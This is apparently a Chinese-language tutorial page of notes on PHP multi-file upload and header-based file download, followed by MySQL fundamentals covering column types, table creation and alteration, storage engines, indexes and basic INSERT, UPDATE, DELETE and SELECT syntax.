<h3 id="处理多个文件上传"><a href="#处理多个文件上传" class="headerlink" title="处理多个文件上传"></a>处理多个文件上传</h3><p>多个文件上传和单独文件上传的处理方式是一样的，只需要在客户端多提供几个类型为“file”的输入表单，并指定不同的“name”属性值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">	&lt;head&gt;&lt;title&gt;文件上传&lt;/title&gt;&lt;/head&gt;</div><div class="line">	&lt;body&gt;</div><div class="line">		&lt;form action=&quot;mul_upload.php&quot;  method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</div><div class="line">			&lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;1000000&quot;&gt;</div><div class="line">			选择文件1：&lt;input type=&quot;file&quot; name=&quot;myfile[]&quot;&gt;&lt;br&gt;</div><div class="line">			选择文件2：&lt;input type=&quot;file&quot; name=&quot;myfile[]&quot;&gt;&lt;br&gt;</div><div class="line">			选择文件3：&lt;input type=&quot;file&quot; name=&quot;myfile[]&quot;&gt;&lt;br&gt;</div><div class="line">			&lt;input type=&quot;submit&quot; value=&quot;上传文件&quot;&gt;</div><div class="line">		&lt;/form&gt;</div><div class="line">	&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>在上面的代码中，将三个文件类型的表单以数组的形式组织在一起。当上面的表单提交给PHP的脚本文件mul_upload.php时，在服务器端同时使用全局数组$_FILES存储所有上传文件的信息，但$_FILES由二维数组已经转变为三维数组，这样就可以存储多个上传文件的信息。在脚本文件mul_upload.php中，使用print_r()函数将$_FILES数组中的内容输出。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	print_r($_FILES);         //打印三维数组$_FILES中的内容，查看一下存储上传文件的结构</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h3 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h3><p>简单的文件下载只需要使用HTML的链接标记a,并将属性href的URL值指定下载的文件即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a href=&quot;http://www.example.com/download/example.rar&quot;&gt;下载文件&lt;/a&gt;</div></pre></td></tr></table></figure></p>
<p>如果通过上面的代码实现文件下载，只能处理一些浏览器不能默认识别的MIME类型文件，例如，当访问example.rar文件时，浏览器并没有直接打开，而是淡出一个下载提示框，提示用户“下载”还是“打开”等处理方式。但如果需要下载后缀名为.html的网页文件、图片文件以及PHP程序脚本文件等，用这种链接形式，则会将文件内容直接输出到浏览器中，并不会提示用户下载。</p>
<p>为了提供文件的安全性，不希望在a标签中给出文件的链接，则必须想浏览器发送必要的头信息，以通知浏览器将要进行下载文件的处理。PHP使用header()函数发送网页的头部信息给浏览器，该函数接受一个头信息的字符串作为参数。文件下载需要发送的头信息包括以下三部分，通过调用三次header()函数完成。以下载图片test.gif为例，需要发送的头信息的代码如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">header(&apos;Content-Type:image/gif&apos;);			//发送指定文件MIME类型的头信息</div><div class="line">header(&apos;Content-Disposition:attachment;filename=&quot;test.gif&quot;&apos;);			//发送描述文件的头信息，附件和文件名</div><div class="line">header(&apos;Content-Length:3390&apos;);			//发送指定文件大小的信息，单位字节</div></pre></td></tr></table></figure></p>
<p>如果使用header()函数向浏览器发送了这三行头信息，图片test.gif就不会直接在浏览器中显示，而是让浏览器将该文件形式下载的形式。在函数header()中，“Content-Type”指定了文件的MIME类型，“Content-Disposition”用于文件的描述，值“attachment;filename=”test.gif””说明这是一个附件，并且指定了下载后的文件名，“Content-Length”则给出被下载文件的大小。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$filename=&quot;test.gif&quot;;                                         //指定文件名</div><div class="line">	header(&apos;Content-Type: image/gif&apos;);                              //指定下载文件类型</div><div class="line">	header(&apos;Content-Disposition: attachment; filename=&quot;&apos;.$filename.&apos;&quot;&apos;);   //指定下载文件的描述</div><div class="line">	header(&apos;Content-Length: &apos;.filesize($filename));                     //指定下载文件的大小         </div><div class="line">	readfile($filename);       //将文件内容读取出来并直接输出，以便下载</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<h1 id="MySQL数据库设计"><a href="#MySQL数据库设计" class="headerlink" title="MySQL数据库设计"></a>MySQL数据库设计</h1><h2 id="MySQL数据库管理"><a href="#MySQL数据库管理" class="headerlink" title="MySQL数据库管理"></a>MySQL数据库管理</h2><h3 id="结构化查询语句SQL"><a href="#结构化查询语句SQL" class="headerlink" title="结构化查询语句SQL"></a>结构化查询语句SQL</h3><p>SQL语句包含四个部分。</p>
<ul>
<li>数据定义语言（DDL）：用于定义和管理数据对象，包括数据库、数据表等。例如：CREATE、DROP、ALTER等语句</li>
<li>数据操作语言（DML）：用于操作数据库对象中所包含的数据。例如：INSERT、UPDATE、DELETE语句。</li>
<li>数据查询语言（DQL）：用于查询数据库对象 中所包含的数据，能够进行单表查询、连接查询、嵌套查询，以及集合查询等各种复杂程度不同的数据库查询，并将数据返回到客户机中显示。例如：SELECT语句。</li>
<li>数据控制语言（DCL）：是用来管理数据库的语言，包含管理权限及数据更改。例如:GRANT、REVOKE、COMMIT、ROLLBACK等语句。</li>
</ul>
<h3 id="MySQL数据库的连接与关闭"><a href="#MySQL数据库的连接与关闭" class="headerlink" title="MySQL数据库的连接与关闭"></a>MySQL数据库的连接与关闭</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql -h 服务器主机地址 -u 用户名 -p 用户密码</div></pre></td></tr></table></figure>
<ul>
<li>-h：指定所连接的数据库服务器位置，可以是IP地址，也可以是服务器域名</li>
<li>-u：指定连接数据库服务器使用的用户名，例如root为管理员用户具有所有权限</li>
<li>-p：连接数据库服务器使用的密码，但-p和其后的参数之间不要有空格。最后是在该参数后直接回车，然后以密文的形式输入密码<br>如果需要退出客户机，可以任何输入exit或quit命令结束会话</li>
</ul>
<h3 id="创建、选择及查看数据库"><a href="#创建、选择及查看数据库" class="headerlink" title="创建、选择及查看数据库"></a>创建、选择及查看数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">CREATE DATABASE [IF NOT EXISTS]bookstore;			#创建一个名为bookstore的数据库</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">DROP DATABASE [IF EXISTS]bookstore;					#删除一个名为bookstore的数据库</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SHOW DATABASES;							#显示所有已建立的数据库名称列表</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">USE bookstore;					#打开bookstore数据库为当前数据库使用</div></pre></td></tr></table></figure>
<h2 id="MySQL数据库中数据表的设计"><a href="#MySQL数据库中数据表的设计" class="headerlink" title="MySQL数据库中数据表的设计"></a>MySQL数据库中数据表的设计</h2><h3 id="数据表（Table）"><a href="#数据表（Table）" class="headerlink" title="数据表（Table）"></a>数据表（Table）</h3><p>数据表是数据库中基本对象元素，以记录（行）和字段（列）组成的二维结构用于存储数据。数据表由表结构和表内容两部分组成，先建立表结构，然后才能输入数据。数据表结构设计主要包括：字段名称、字段类型和字段属性的设置。</p>
<h3 id="数据值和列类型"><a href="#数据值和列类型" class="headerlink" title="数据值和列类型"></a>数据值和列类型</h3><p>对MySQL中数据值的分类，有数值型、字符型、日期型和空值等，MySQL数据库的表是一个二维表，由一个或多个数据列构成。MySQL中的列类型有三种：数值类、字符串类和日期/时间类。</p>
<h4 id="数组类的数据列类型"><a href="#数组类的数据列类型" class="headerlink" title="数组类的数据列类型"></a>数组类的数据列类型</h4><p>MySQL中的数值分整型和浮点型两种。而整型中又分为五种整形数据列类型，即TINYINT,SMALLINT,MEDIUMINT,INT和BIGINT。MySQL也有三种浮点型数据列类型，分别是：FLOAT,BOUBLE和DECIMAL。</p>
<table>
<thead>
<tr>
<th>数据列类型</th>
<th style="text-align:left">存储空间</th>
<th>说明</th>
<th>取值范围</th>
</tr>
</thead>
<tbody>
<tr>
<td>TINYINT</td>
<td style="text-align:left">1字节</td>
<td>非常小的整数</td>
<td>带符号值：-128-127   无符号：0-255</td>
</tr>
<tr>
<td>SMALLINT</td>
<td style="text-align:left">2字节</td>
<td>较小的整数</td>
<td>带符号值：-32768-32767   无符号：0-65535</td>
</tr>
<tr>
<td>MEDIUMINT</td>
<td style="text-align:left">3字节</td>
<td>中等大小的整数</td>
<td>带符号值：-8388608-8388607   无符号：0-16777215</td>
</tr>
<tr>
<td>INT</td>
<td style="text-align:left">4字节</td>
<td>标准整数</td>
<td>带符号值：-2147483648-2147483647   无符号：0-4294967295</td>
</tr>
<tr>
<td>BIGINT</td>
<td style="text-align:left">8字节</td>
<td>大整数</td>
<td>带符号值：-9223372036854775808-9233372036854775807   无符号：0-18446744073709551615</td>
</tr>
<tr>
<td>FLOAT</td>
<td style="text-align:left">4或8字节</td>
<td>单精度浮点数</td>
<td>最小非零值：+-1.175494351E-38 最大非零值：+-3.402823466E+38</td>
</tr>
<tr>
<td>DOUBLE</td>
<td style="text-align:left">8字节</td>
<td>双精度浮点数</td>
<td>最小非零值：+-2.2250738585072014E-308 最大非零值：+-1.7976931348623157E+308</td>
</tr>
<tr>
<td>DECIMAL</td>
<td style="text-align:left">自定义</td>
<td>以字符串形式表示的浮点数</td>
<td>取决于存储单位字节数</td>
</tr>
</tbody>
</table>
<h4 id="字符串类数据列类型"><a href="#字符串类数据列类型" class="headerlink" title="字符串类数据列类型"></a>字符串类数据列类型</h4><table>
<thead>
<tr>
<th>数据列类型</th>
<th style="text-align:left">存储空间</th>
<th>说明</th>
<th>最大长度</th>
</tr>
</thead>
<tbody>
<tr>
<td>CHAR[(M)]</td>
<td style="text-align:left">M字节</td>
<td>定长字符串</td>
<td>M字节</td>
</tr>
<tr>
<td>VARCHAR[(M)]</td>
<td style="text-align:left">L+1字节</td>
<td>可变字符串</td>
<td>M字节</td>
</tr>
<tr>
<td>TINYBLOD,TINYTEXT</td>
<td style="text-align:left">L+1字节</td>
<td>非常小的BLOB(二进行大对象)和文本串</td>
<td>2e+8-1字节</td>
</tr>
<tr>
<td>BLOB,TEXT</td>
<td style="text-align:left">L+2字节</td>
<td>小BLOB和文本串</td>
<td>2e+16-4字节</td>
</tr>
<tr>
<td>MEDIUMBLOB,MEDIUMTEXT</td>
<td style="text-align:left">L+3字节</td>
<td>中等的BLOB和文本串</td>
<td>2e24-1字节</td>
</tr>
<tr>
<td>LONGBLOB,LONGTEXT</td>
<td style="text-align:left">L+4字节</td>
<td>大BLOB和文本串</td>
<td>2e32-1字节</td>
</tr>
<tr>
<td>ENUM(‘value1’,’value2’,…)</td>
<td style="text-align:left">1或2字节</td>
<td>枚举：可赋予某个枚举成员</td>
<td>65535个成员</td>
</tr>
<tr>
<td>SET(‘value1’,’value2’,…)</td>
<td style="text-align:left">1,2,3,4或8字节</td>
<td>集合：可赋予多个集合成员</td>
<td>64个成员</td>
</tr>
</tbody>
</table>
<p>对于可变长的字符串类型，其长度取决于实际存放在劣种的值的长度。此长度用L来表示。</p>
<h4 id="日期和时间型数据列类型"><a href="#日期和时间型数据列类型" class="headerlink" title="日期和时间型数据列类型"></a>日期和时间型数据列类型</h4><table>
<thead>
<tr>
<th>数据列类型</th>
<th style="text-align:left">存储空间</th>
<th>说明</th>
<th>最大长度</th>
</tr>
</thead>
<tbody>
<tr>
<td>DATE</td>
<td style="text-align:left">3字节</td>
<td>“YYYY-MM-DD”格式表示的日期值</td>
<td>1000-01-01~9999-12-31</td>
</tr>
<tr>
<td>TIME</td>
<td style="text-align:left">3字节</td>
<td>“hh:mm:ss”格式表示的时间值</td>
<td>-838:59:59~838:59:59</td>
</tr>
<tr>
<td>DATETIME</td>
<td style="text-align:left">8字节</td>
<td>“YYYY-MM-DD hh:mm:ss”格式</td>
<td>1000-01-01 00:00:00到9999-12-31 23:59:59</td>
</tr>
<tr>
<td>TIMESTAMP</td>
<td style="text-align:left">4字节</td>
<td>“YYYYMMDDhhmmss”格式表示的时间戳</td>
<td>19700101000000~2037年的某个时刻</td>
</tr>
<tr>
<td>YEAR</td>
<td style="text-align:left">1字节</td>
<td>“YYYY”格式的年份量</td>
<td>1901~2155</td>
</tr>
</tbody>
</table>
<h4 id="NULL值"><a href="#NULL值" class="headerlink" title="NULL值"></a>NULL值</h4><p>NULL意味着”没有值”或”未知值”，MySQL中，0或NULL都意味着假而其他值意味着真。布尔运算的默认真值是1.</p>
<h3 id="数据字段属性"><a href="#数据字段属性" class="headerlink" title="数据字段属性"></a>数据字段属性</h3><h4 id="UNSIGNED"><a href="#UNSIGNED" class="headerlink" title="UNSIGNED"></a>UNSIGNED</h4><p>该属性也只能用于设置数值类型，在数值之前自动用0补齐数据列出现负数。</p>
<h4 id="ZEROFILL"><a href="#ZEROFILL" class="headerlink" title="ZEROFILL"></a>ZEROFILL</h4><p>该属性也只能用于设置数值类型，在数值之前自动用0补充不足的位数。</p>
<h4 id="AUTO-INCREMENT"><a href="#AUTO-INCREMENT" class="headerlink" title="AUTO_INCREMENT"></a>AUTO_INCREMENT</h4><p>该属性用于设置字段的自动增量属性，当数值类型的字段设置为自动增量时，每增加一条新纪录，该字段的值就自动加1，而且此字段的值不允许重复。此修饰符只能修饰整数类型的字段。</p>
<h4 id="NULL和NOT-NULL"><a href="#NULL和NOT-NULL" class="headerlink" title="NULL和NOT NULL"></a>NULL和NOT NULL</h4><p>默认为NULL，即插入值时没有在此字段插入值，默认为NULL值，如果指定了NOT NULL，则必须在插入值时在此字段添入值</p>
<h4 id="DEFAULT"><a href="#DEFAULT" class="headerlink" title="DEFAULT"></a>DEFAULT</h4><p>可以通过此属性来指定一个默认值，如果没有在此列添加值，那么默认添加此值。</p>
<h3 id="创建、修改及删除表"><a href="#创建、修改及删除表" class="headerlink" title="创建、修改及删除表"></a>创建、修改及删除表</h3><h4 id="创建表（CREATE-TABLE）"><a href="#创建表（CREATE-TABLE）" class="headerlink" title="创建表（CREATE TABLE）"></a>创建表（CREATE TABLE）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">CREATE TABLE [IF NOT EXISTS] 表名称（			#创建带给定名称的表，必须拥有表CREATE权限</div><div class="line">	字段名1 列类型 [属性][索引],			#声明表中第一个字段，必须有字段名和列类型</div><div class="line">	字段名2 列类型 [属性][索引],			</div><div class="line">	...,</div><div class="line">	字段名n 列类型 [属性][索引],			#每个字段的属性和索引都是可选的，根据需要设置</div><div class="line">）[表类型][表字符集];							#在创建表时也可指定可选的表类型和字符集的设置</div></pre></td></tr></table></figure>
<p>其中[]中的为可选的内容，一个表可以由一个或多个字段（列）组成，在字段名后面一定要注明该字段的数据类型。每个字段也可以使用属性对其进行限制说明，但属性是可选的，根据表的需要进行声明。</p>
<h4 id="修改表（ALTER-TABLE）"><a href="#修改表（ALTER-TABLE）" class="headerlink" title="修改表（ALTER TABLE）"></a>修改表（ALTER TABLE）</h4><p>可以用ALTER TABLE语句来修改表的结构，包括添加新的字段、删除原有的字段、修改列的类型、属性及索引，甚至可以修改表的名称。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ALTER TABLE 表名 ACTION；				#修改表的语法格式</div></pre></td></tr></table></figure></p>
<p>其中ACTION是ALTER TABLE的从句，包括为指定的表添加一新列、为表添加一个索引、更改指定列默认值、更改列类型、删除一列、删除索引、更改表名等语句。</p>
<ul>
<li>为指定的数据表添加一新字段，可以在ACTION从句中使用ADD关键字实现<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ALTER TABLE 表名 ADD 字段名 &lt;建表语句&gt;[FIRST|AFTER 列名]		#为指定的表添加新列</div></pre></td></tr></table></figure>
</li>
</ul>
<p>如果没指定可选的FIRST或AFTER，则在列尾添加一列，否则在指定列添加新列。</p>
<ul>
<li>为指定的数据表为了更改原有字段的类型，可使用CHANGE或MODIFY子句。如果原列的名字和新列的名字相同，则change或Modify的作用相同。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ALTER TABLE 表名 CHANGE(MODIFY) 列表 &lt;建表语句&gt;		#为指定的表修改列类型</div></pre></td></tr></table></figure>
</li>
</ul>
<p>CHANGE除了更改类型外还能更改列名，而MODIFY不能实现这个功能。</p>
<ul>
<li>如果需要为指定的数据表重新命名，可使用RENAME AS子句，给出旧表名和新表名即可。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ALTER TABLE 旧表名 RENAME AS 新表名			#为 指定的数据表重新命名</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="删除表（DROP-TABLE）"><a href="#删除表（DROP-TABLE）" class="headerlink" title="删除表（DROP TABLE）"></a>删除表（DROP TABLE）</h4><p>可以使用SQL的DROP TABLE语句删除。删除表要比创建和修改表要容易得多，只需要指定表名即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">DROP TABLE[IF EXISTS] 表名</div></pre></td></tr></table></figure></p>
<p>当不能确定数据表是否存在，如果存在就删除它，如果存在就删除它，不存在则删除时也不行出现错误，就可在DROPTABLE语句中增加IF EXISTS。同CREATE TABLE一样，IF EXISTS语句在含有DROP TABLE的SQL脚本中很常用，如果不存在待删除的表，脚本会继续向下执行而不会跑出错误。</p>
<h3 id="数据表的类型及存储位置"><a href="#数据表的类型及存储位置" class="headerlink" title="数据表的类型及存储位置"></a>数据表的类型及存储位置</h3><p>MySQL支持MyISAM、InnoDB、HEAP、BOB、ARCHIVE、CSV等多种数据表类型，在创建一个新MySQL数据库表时，可以为它设置一个类型。</p>
<h4 id="MyISAM数据表"><a href="#MyISAM数据表" class="headerlink" title="MyISAM数据表"></a>MyISAM数据表</h4><p>MyISAM数据表类型的特点是成熟、稳定和易于管理。</p>
<h4 id="InnoDB数据表"><a href="#InnoDB数据表" class="headerlink" title="InnoDB数据表"></a>InnoDB数据表</h4><p>InnoDB给MySQL提供了具有提交，回滚和崩溃恢复能力的事务安全存储引擎。</p>
<h4 id="MyISAM和InnoDB两个表的功能简单对比"><a href="#MyISAM和InnoDB两个表的功能简单对比" class="headerlink" title="MyISAM和InnoDB两个表的功能简单对比"></a>MyISAM和InnoDB两个表的功能简单对比</h4><table>
<thead>
<tr>
<th>表类型功能对比</th>
<th style="text-align:left">MyISAM表</th>
<th>InnoDB</th>
</tr>
</thead>
<tbody>
<tr>
<td>事务处理</td>
<td style="text-align:left">不支持</td>
<td>支持</td>
</tr>
<tr>
<td>数据行锁定</td>
<td style="text-align:left">不支持，只有表锁定</td>
<td>支持</td>
</tr>
<tr>
<td>外键约束</td>
<td style="text-align:left">不支持</td>
<td>支持</td>
</tr>
<tr>
<td>表空间大小</td>
<td style="text-align:left">相对小</td>
<td>相对大，最大是2倍</td>
</tr>
<tr>
<td>全文索引</td>
<td style="text-align:left">支持</td>
<td>不支持</td>
</tr>
<tr>
<td>COUNT问题</td>
<td style="text-align:left">无</td>
<td>执行COUNT(*)查询，速度慢</td>
</tr>
</tbody>
</table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">CREATE TABLE t(i INT) ENGINE = INNODB;				#新建表t时指定表类型为INNODB</div><div class="line">CREATE TABLE t(i INT) TYPE = MYISAM;				#新建表t时指定表类型为MYISAM</div></pre></td></tr></table></figure>
<h3 id="数据表的默认字符集"><a href="#数据表的默认字符集" class="headerlink" title="数据表的默认字符集"></a>数据表的默认字符集</h3><p>使用CREATE TABLE命令创建数据表时，如果没有明确地指定任何字符集，则新创建数据库的字符集将由MySQL配置文件里character-set-server选项的设置决定。在MySQL配置文件（Linux系统为/etc/my.cnf文件，Windows系统则是my.ini文件）里设置数据表的字符集。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">character-set-server = gbk		#设置MySQL服务器的字符集</div><div class="line">collation-server	= gbk_chinese_ci		#设置排序方法</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">CREATE DATABASE IF NOT EXISTS mydb DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;</div><div class="line">#为新创建的数据库mydb设置默认的字符集</div></pre></td></tr></table></figure>
<h3 id="创建索引"><a href="#创建索引" class="headerlink" title="创建索引"></a>创建索引</h3><p>在MySQL中主要有四类索引：主键索引（PRIMARY KEY）、唯一索引（UNIQUE）、常规索引（INDEX）和全文索引（FULLTEXT）。</p>
<h4 id="主键索引（PRIMARY-KEY）"><a href="#主键索引（PRIMARY-KEY）" class="headerlink" title="主键索引（PRIMARY KEY）"></a>主键索引（PRIMARY KEY）</h4><p>主键索引是关系数据库中最常见的索引类型，主要作用是确定数据表里一条特定的数据记录的位置。数据表会根据主键的唯一性来唯一标识每条记录，使用任意两条记录里的主键字段不允许是同样的内容，这样可以加快寻址定位时的速度。最好为每张数据表指定一个主键，但一个表只能指定一个主键，而且主键的值不能为空，不过可以有多个候选索引。</p>
<h4 id="唯一索引（UNIQUE）"><a href="#唯一索引（UNIQUE）" class="headerlink" title="唯一索引（UNIQUE）"></a>唯一索引（UNIQUE）</h4><p>唯一索引与主键索引一样，都可以防止创建重复的值。但是，不同之处在于，每个数据表中只能有一个主键索引，但可以有多个唯一索引。如果能确定某个数据列将只包含彼此各不相同的值，在为这个数据列创建索引的时候就应该使用关键字UNIQUE把它定义为一个唯一索引。</p>
<h4 id="常规索引（INDEX）"><a href="#常规索引（INDEX）" class="headerlink" title="常规索引（INDEX）"></a>常规索引（INDEX）</h4><p>创建常规索引可以使用关键字KEY或INDEX随表一同创建，KEY通常是INDEX同义词。也可以在创建表之后CREATE INDEX或ALTER TABLE命令来创建。<br>如果在创建表时没有创建索引，就需要使用CREATE INDEX命令来创建同样的常规索引。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">CREATE INDEX ind ON carts(userId,bookId）;			#创建名称为ind的索引为carts表的两个列</div></pre></td></tr></table></figure></p>
<h4 id="全文索引（FULLTEXT）"><a href="#全文索引（FULLTEXT）" class="headerlink" title="全文索引（FULLTEXT）"></a>全文索引（FULLTEXT）</h4><p>全文索引在MySQL中是一个FULLTEXT类型索引，但FULLTEXT索引只能用于MyISAM表，并且只可以在CHAR、VARCHAR或TEXT类型的列上创建，也允许创建在一个或多个数据列上。</p>
<h2 id="SQL语言设计"><a href="#SQL语言设计" class="headerlink" title="SQL语言设计"></a>SQL语言设计</h2><h3 id="使用DML命令操作数据表中的数据记录"><a href="#使用DML命令操作数据表中的数据记录" class="headerlink" title="使用DML命令操作数据表中的数据记录"></a>使用DML命令操作数据表中的数据记录</h3><p>为了修改数据库中的数据，SQL的数据操纵语言（DML）提供了增（INSERT）、删（DELETE）、改（UPDATE）语句。</p>
<h4 id="使用INSERT语句想数据表中添加数据"><a href="#使用INSERT语句想数据表中添加数据" class="headerlink" title="使用INSERT语句想数据表中添加数据"></a>使用INSERT语句想数据表中添加数据</h4><p>插入数据是向已经存在的数据表中添加一条新的记录，应该使用INSERT INTO语句。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">INSERT INTO 表名 [(字段名1,字段名2,...,字段名n] VALUES(&apos;值1&apos;,&apos;值2&apos;,...,&apos;值n&apos;);</div></pre></td></tr></table></figure></p>
<p>在表名后面的括号中是该表中定义的字段名称列表，它们与VALUES子句后面的表达式列表的值是一一对应的，个数也要相等，并且表达式值的类型必须与字段的类型一致。需要用逗号将各个数据分开，字符型数据要用单引号括起来。INSERT语句也可以省略字段列表，但必须插入一行完整的数据，而且必须按表中定义的字段顺序为全部字段提供值。</p>
<h4 id="使用UPDATE语句更新数据表中已存在的数据"><a href="#使用UPDATE语句更新数据表中已存在的数据" class="headerlink" title="使用UPDATE语句更新数据表中已存在的数据"></a>使用UPDATE语句更新数据表中已存在的数据</h4><p>SQL语句可以使用UPDATE语句对表中的一列或多列数据进行修改，必须指定需要修改的字段，以及需要赋予的新值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">UPDATE 表名				#需要给出被修改的表格</div><div class="line">SET 字段名=表达式[, .....]			#可以对表中一列或多列数据进行修改</div><div class="line">[WHERE 条件];					#给出必要的WHERE子名指定要更新的数据行</div></pre></td></tr></table></figure></p>
<p>其中的WHERE子句是必需的，如果不使用WHERE检索条件，则UPDATE语句会将数据表中全部数据行都修改。</p>
<h4 id="使用DELETE语句删除数据表中不需要的数据记录"><a href="#使用DELETE语句删除数据表中不需要的数据记录" class="headerlink" title="使用DELETE语句删除数据表中不需要的数据记录"></a>使用DELETE语句删除数据表中不需要的数据记录</h4><p>使用DELETE语句用来删除数据表中的一条或多条数据记录。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">DELETE FROM 表名 [WHERE 条件];			#删除表中记录行的DELETE语法格式</div></pre></td></tr></table></figure></p>
<p>如果没有指定WHERE子句的检索条件，DELETE语句将会删除数据表中的全部数据记录，使用数据库中只剩下数据表结构。</p>
<h3 id="通过DQL命令查询数据表中的数据"><a href="#通过DQL命令查询数据表中的数据" class="headerlink" title="通过DQL命令查询数据表中的数据"></a>通过DQL命令查询数据表中的数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">SELECT [ALL|DISTINCT]				#使用SELECT语句查询检索</div><div class="line">&#123;*|table.*|[table.]field1[AS alias1][,[table.]field2[AS alias2][,...]]&#125;				#选择哪些数据列</div><div class="line">FROM tableexpression[,...][IN externaldatabase]				#指定SELECT语句中字段的来源</div><div class="line">[WHERE...]			#数据行必须满足哪些检索条件</div><div class="line">[GROUP BY...]			#指明按照哪几字段来分组</div><div class="line">[HAVING...]			#过滤分组的记录，必须满足的次要条件</div><div class="line">[ORDER BY...]			#按一个或多个字段排序查询结果</div><div class="line">[LIMIT count];			#对结构个数限制</div></pre></td></tr></table></figure>
<p>用中括号“[]”括起来的部分表示是可选的，用大括号“{}”括起来的部分是标识必须从中选择其中的一个。FROM子句指定了SELECT语句中字段的来源，FROM子句后面是包含一个或多个的表达式（由逗号分开），其中的表达式可为单一表名称、已保存的查询或由INNER JOIN、LEFT JOIN或RIGHT JOIN得到的复合结果。</p>
<h4 id="选择特定的字段"><a href="#选择特定的字段" class="headerlink" title="选择特定的字段"></a>选择特定的字段</h4><p>使用SELECT语句检索记录的特定字段，多个字段可以用逗号分隔。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT field1,field2 FROM table1;</div></pre></td></tr></table></figure></p>
<p>可以使用“<em>”从表中检索出所有字段，使用“SELECT</em>”主要是针对用户的书写方便而言。对于不同的数据表，这个操作可将表中每一行、列的数据全部检索出来。</p>
<h4 id="使用AS子句为字段取别名"><a href="#使用AS子句为字段取别名" class="headerlink" title="使用AS子句为字段取别名"></a>使用AS子句为字段取别名</h4><p>如果想为返回的列取一个新的标题，以及经过对字段的计算或总结之后，产生了一个新的值，希望把它放到一个新的列里显示，则用AS保留。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT Name as &apos;名称&apos;,author as &apos;作者&apos;,price as &apos;价格&apos;FROM tables;</div></pre></td></tr></table></figure></p>
<p>定义别名时一定要使用单引号引起来。其中AS关键字是可选的，在原字段名和别名之间使用一个空格即可。<br>在有多个表关联查询的情况下，如果表中有同名的字段时，则必须使用别名加以区分。</p>
